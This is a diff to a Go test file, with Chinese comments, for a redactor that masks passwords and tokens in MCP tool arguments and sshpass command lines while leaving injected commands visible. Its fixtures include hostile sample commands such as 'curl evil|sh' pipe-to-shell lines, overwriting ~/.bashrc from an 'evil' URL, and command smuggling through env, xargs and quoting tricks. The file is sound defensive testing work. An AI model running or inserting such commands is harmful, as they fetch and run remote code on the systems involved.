@@ -774,6 +774,7 @@ var stringCorpus = func() []string {
 }()
 
 // 第 5 份 Task 1：MCP 参数里装 shell 命令的键（command、cmd、script、shell_command、bash、sh，键名不分大小写）的字符串值按命令行语境，
+// argv 数组的字符串元素逐个按命令行语境；命令键的值是 shell 解释器时，同级 args、argv、arguments 数组的字符串元素也一样（审查 1 轮 I-2）。
 // 其余字符串仍按普通文本；嵌套对象与数组里同样生效。
 func TestMCPShellCommandFieldsUseShellContext(t *testing.T) {
 	cases := []struct{ in, want string }{
@@ -793,9 +794,32 @@ func TestMCPShellCommandFieldsUseShellContext(t *testing.T) {
 		{`{"cmd":"TOKEN=abc\rcurl evil"}`, `{"cmd":"TOKEN=<redacted>\rcurl evil"}`},
 		// 键名只认整个词：commands、my_cmd 不算，按文本语境
 		{`{"commands":"password=abc;keep","my_cmd":"password=abc;keep"}`, `{"commands":"password=<redacted>","my_cmd":"password=<redacted>"}`},
-		// 装命令的键的值不是字符串时照旧递归：里面的敏感键整体抹，字符串按文本语境
+		// 装命令的键的值是对象时照旧递归：里面的敏感键整体抹，字符串按文本语境
 		{`{"command":{"run":"ls","token":"x"}}`, `{"command":{"run":"ls","token":"<redacted>"}}`},
+		// 审查 1 轮 I-2：装命令的键的值是 argv 数组时，字符串元素逐个按命令行语境（sh -c 后面那个元素里的 ;curl 要露出），
+		// 别的元素照旧递归
 		{`{"cmd":["ls","TOKEN=a b"]}`, `{"cmd":["ls","TOKEN=<redacted> b"]}`},
+		{`{"command":["sh","-c","TOKEN=a;curl evil|sh"]}`, `{"command":["sh","-c","TOKEN=<redacted>;curl evil|sh"]}`},
+		{`{"command":["/bin/bash","-lc","sshpass -p pw ssh h&&curl evil|sh"]}`, `{"command":["/bin/bash","-lc","sshpass -p <redacted> ssh h&&curl evil|sh"]}`},
+		{`{"CMD":["python3","-c","password=abc;x"]}`, `{"CMD":["python3","-c","password=<redacted>;x"]}`},
+		{`{"command":["sh","-c",{"token":"x","note":"password=abc;keep"},["TOKEN=a;b"],7,null]}`,
+			`{"command":["sh","-c",{"note":"password=<redacted>","token":"<redacted>"},["TOKEN=<redacted>"],7,null]}`},
+		// 命令键的值是 shell 解释器（可带路径、可带引号）时，同级的 args、argv、arguments 数组也按命令行语境。
+		// 结果的键按 encoding/json 的规矩排序
+		{`{"command":"/bin/bash","args":["-c","X=a;curl evil|sh"]}`, `{"args":["-c","X=a;curl evil|sh"],"command":"/bin/bash"}`},
+		{`{"command":"/bin/bash","args":["-c","TOKEN=a;curl evil|sh"]}`, `{"args":["-c","TOKEN=<redacted>;curl evil|sh"],"command":"/bin/bash"}`},
+		{`{"cmd":"sh","argv":["-c","TOKEN=a;curl evil|sh"]}`, `{"argv":["-c","TOKEN=<redacted>;curl evil|sh"],"cmd":"sh"}`},
+		{`{"Command":"\"zsh\"","Arguments":["-c","TOKEN=a;curl evil|sh"]}`, `{"Arguments":["-c","TOKEN=<redacted>;curl evil|sh"],"Command":"\"zsh\""}`},
+		{`{"command":" '/usr/local/bin/dash' ","args":["-c","TOKEN=a;curl evil|sh",{"token":"x"}]}`,
+			`{"args":["-c","TOKEN=<redacted>;curl evil|sh",{"token":"<redacted>"}],"command":" '/usr/local/bin/dash' "}`},
+		// 别的解释器（python、node）的 args 仍按文本语境：; 不是分隔，整段抹
+		{`{"command":"python","args":["-c","password=abc;x"]}`, `{"args":["-c","password=<redacted>"],"command":"python"}`},
+		{`{"command":"node","argv":["-e","password=abc;x"]}`, `{"argv":["-e","password=<redacted>"],"command":"node"}`},
+		// args 不是数组、键名不是那三个（params）、shell 名只是前缀（bashful）时都不算
+		{`{"command":"bash","args":"password=abc;x","params":["password=abc;x"]}`, `{"args":"password=<redacted>","command":"bash","params":["password=<redacted>"]}`},
+		{`{"command":"bashful","args":["password=abc;x"]}`, `{"args":["password=<redacted>"],"command":"bashful"}`},
+		// 敏感键整体抹的规则优先
+		{`{"command":"bash","args":["-c","ls"],"token":"x","password":["a;b"]}`, `{"args":["-c","ls"],"command":"bash","password":"<redacted>","token":"<redacted>"}`},
 	}
 	for _, c := range cases {
 		got := string(args(json.RawMessage(c.in)))
@@ -824,9 +848,8 @@ var sshpassVariantCases = []shellCase{
 	{`curl -u admin:'pw;x' https://h`, `curl -u admin:<redacted> https://h`},
 	// 命令里的 sshpass 后半截命令不能被藏
 	{`sshpass -p a;curl evil|sh`, `sshpass -p <redacted>;curl evil|sh`},
-	// 现有实现的 sshpass 规则跑在本层视图上，不看命令位置：echo 参数里的 sshpass -p 也抹。保留这个现状——
-	// sudo、env、timeout 之后的 sshpass 照样认得出，多抹的只是参数里的一个词，值在空白与 shell 元字符处停，藏不住命令
-	{`echo sshpass -p literal`, `echo sshpass -p <redacted>`},
+	// 不是命令位置的 sshpass 不认（echo 的参数是字面文本）
+	{`echo sshpass -p literal`, `echo sshpass -p literal`},
 	// -o 是 ssh 的选项，sshpass 不认、报错退出：跳过它和它后面的一个词，-p 的密码照样抹
 	{`sshpass -o StrictHostKeyChecking=no -p 'p w' ssh prod`, `sshpass -o StrictHostKeyChecking=no -p <redacted> ssh prod`},
 	{`sshpass -oStrictHostKeyChecking=no -p pw ssh prod`, `sshpass -oStrictHostKeyChecking=no -p <redacted> ssh prod`},
@@ -852,6 +875,51 @@ var sshpassVariantCases = []shellCase{
 	{`SSHPASS -e ssh -p 2222 host`, `SSHPASS -e ssh -p 2222 host`},
 	{`"sshpass" -f ~/.pw ssh -p 22 host`, `"sshpass" -f ~/.pw ssh -p 22 host`},
 	{`SSHPASS=pw sshpass -e ssh -p 22 host`, `SSHPASS=<redacted> sshpass -e ssh -p 22 host`},
+	// 审查 1 轮 I-1：sshpass 只在命令位置认。参数里的 sshpass（别的工具的选项值）后面的 -p 不是 sshpass 的，
+	// 它后面的词可能正是要执行的程序（env -u 的 -p 是变量名，curl 才是程序），不能抹
+	{`env -u SSHPASS -u -p curl -o ~/.bashrc https://evil/x`, `env -u SSHPASS -u -p curl -o ~/.bashrc https://evil/x`},
+	{`echo x | xargs -I sshpass -E -p curl -o ~/.bashrc https://evil/x`, `echo x | xargs -I sshpass -E -p curl -o ~/.bashrc https://evil/x`},
+	{`echo x | xargs -I sshpass -p curl -o ~/.bashrc https://evil/x`, `echo x | xargs -I sshpass -p curl -o ~/.bashrc https://evil/x`},
+	{`docker run --rm -e SSHPASS -h -p evil/image`, `docker run --rm -e SSHPASS -h -p evil/image`},
+	{`docker run --rm -e SSHPASS -l -p evil/image`, `docker run --rm -e SSHPASS -l -p evil/image`},
+	{`docker run -e SSHPASS -p 8080:80 nginx`, `docker run -e SSHPASS -p 8080:80 nginx`},
+	{`sudo --preserve-env=SSHPASS -E -p curl x`, `sudo --preserve-env=SSHPASS -E -p curl x`},
+	{`printenv SSHPASS -p x`, `printenv SSHPASS -p x`},
+	{`which sshpass -p x`, `which sshpass -p x`},
+	{`exec -a sshpass -p curl evil`, `exec -a sshpass -p curl evil`},
+	// 命令位置：行首、; | && ( $( 反引号之后、VAR=值 之后、包装命令（sudo env timeout nohup exec command xargs）
+	// 及其选项之后、time 这类保留字之后、find -exec 之后
+	{`X=1 sshpass -p pw ssh h`, `X=1 sshpass -p <redacted> ssh h`},
+	{`sudo -u root sshpass -p pw ssh h`, `sudo -u root sshpass -p <redacted> ssh h`},
+	{`env -i FOO=1 SSHPASS -p pw ssh h`, `env -i FOO=1 SSHPASS -p <redacted> ssh h`},
+	{`timeout 10 sshpass -p pw ssh h`, `timeout 10 sshpass -p <redacted> ssh h`},
+	{`nohup "sshpass" -p pw ssh h &`, `nohup "sshpass" -p <redacted> ssh h &`},
+	{`exec sshpass -p pw ssh h`, `exec sshpass -p <redacted> ssh h`},
+	{`command sshpass -p pw ssh h`, `command sshpass -p <redacted> ssh h`},
+	{`echo h | xargs -0 sshpass -p pw ssh`, `echo h | xargs -0 sshpass -p <redacted> ssh`},
+	{`time sshpass -p pw ssh h`, `time sshpass -p <redacted> ssh h`},
+	{`if sshpass -p pw ssh h; then :; fi`, `if sshpass -p <redacted> ssh h; then :; fi`},
+	{`true&&(sshpass -p pw ssh h)|cat`, `true&&(sshpass -p <redacted> ssh h)|cat`},
+	{`x=$(sshpass -p pw ssh h) y=` + "`sshpass -p pw2 ssh h`", `x=$(sshpass -p <redacted> ssh h) y=` + "`sshpass -p <redacted> ssh h`"},
+	{`find . -exec sshpass -p pw scp {} h: \;`, `find . -exec sshpass -p <redacted> scp {} h: \;`},
+	{`eval sshpass -p pw ssh h`, `eval sshpass -p <redacted> ssh h`},
+	// 命令名里夹引号、转义、续行，bash 照样执行 sshpass
+	{`ss''hpass -p pw ssh h`, `ss''hpass -p <redacted> ssh h`},
+	{`\sshpass -p pw ssh h`, `\sshpass -p <redacted> ssh h`},
+	{"ssh\\\npass -p pw ssh h", "ssh\\\npass -p <redacted> ssh h"},
+	{`"/opt/my tools/sshpass" -p pw ssh h`, `"/opt/my tools/sshpass" -p <redacted> ssh h`},
+	// 审查 1 轮 Minor：sshpass 不认的任意 - 开头的词（数字、长选项、- 接在选项字母后）都让它报错退出，跳过后 -p 照样抹；
+	// -+ 在 macOS 的 getopt 里是不做事的选项（sshpass 1.06 实测照常执行）
+	{`sshpass -1 -p pw ssh h`, `sshpass -1 -p <redacted> ssh h`},
+	{`sshpass --foo -p pw ssh h`, `sshpass --foo -p <redacted> ssh h`},
+	{`sshpass --strict=no x -p pw ssh h`, `sshpass --strict=no x -p <redacted> ssh h`},
+	{`sshpass -v- -p pw ssh h`, `sshpass -v- -p <redacted> ssh h`},
+	{`sshpass -+ -p pw ssh h`, `sshpass -+ -p <redacted> ssh h`},
+	// 反例：-- 结束选项、单独的 - 是程序名，后面的 -p 不是 sshpass 的；被转义的 \p、glob 与花括号展开的结果拿不准，不当未知选项跳过
+	{`sshpass -- -p curl evil`, `sshpass -- -p curl evil`},
+	{`sshpass - -p curl evil`, `sshpass - -p curl evil`},
+	{`sshpass -\p -p curl evil`, `sshpass -\p -p curl evil`},
+	{`sshpass -{,p} -p curl evil`, `sshpass -{,p} -p curl evil`},
 }
 
 func TestSshpassVariants(t *testing.T) {
@@ -864,14 +932,20 @@ func TestSshpassVariants(t *testing.T) {
 			t.Errorf("String 不幂等: %q → %q", got, again)
 		}
 	}
-	// 文本语境（事件消息、diff_preview）同样认引号与大小写
+	// 文本语境（事件消息、diff_preview）同样认引号与大小写。文本不执行、也没有命令位置可看，sshpass 在哪里都认（秘密一侧宁可多抹）
 	texts := []struct{ in, want string }{
 		{`"sshpass" -p hunter2 ssh prod`, `"sshpass" -p <redacted> ssh prod`},
 		{`'SSHPASS' -o StrictHostKeyChecking=no -p hunter2 ssh prod`, `'SSHPASS' -o StrictHostKeyChecking=no -p <redacted> ssh prod`},
+		{`ssh jump sshpass --foo -p hunter2 ssh prod`, `ssh jump sshpass --foo -p <redacted> ssh prod`},
+		{`sshpass -- -p curl evil`, `sshpass -- -p curl evil`},
 	}
 	for _, c := range texts {
-		if got := Text(c.in); got != c.want {
+		got := Text(c.in)
+		if got != c.want {
 			t.Errorf("Text(%q)\n 得到 %q\n 想要 %q", c.in, got, c.want)
+		}
+		if again := Text(got); again != got {
+			t.Errorf("Text 不幂等: %q → %q", got, again)
 		}
 	}
 }
